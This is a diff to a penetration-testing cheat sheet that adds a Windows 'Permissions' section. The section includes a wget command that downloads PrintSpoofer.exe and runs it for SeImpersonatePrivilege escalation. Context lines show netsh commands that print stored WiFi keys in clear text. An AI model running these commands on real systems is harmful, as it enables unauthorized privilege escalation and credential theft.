@@ -64,6 +64,7 @@
 * [Looting](#Looting)
 * [Bloodhound](#Bloodhound)
 * [WiFi](#WiFi)
+* [Permissions](#Permissions)
 
 ## Encoding / Cryptography
 
@@ -1067,6 +1068,22 @@ bloodhound
 ```
 netsh wlan show profile
 netsh wlan show profile <SSID> key=clear
+```
+
+# Permissions
+
+### Get Current User Permissions
+```
+whoami /all
+whoami /priv
+```
+
+### SeImpersonatePrivilege
+```
+# Privilege Escalation: https://github.com/dievus/printspoofer
+
+wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
+PrintSpoofer.exe -i -c cmd
 ```
 
 
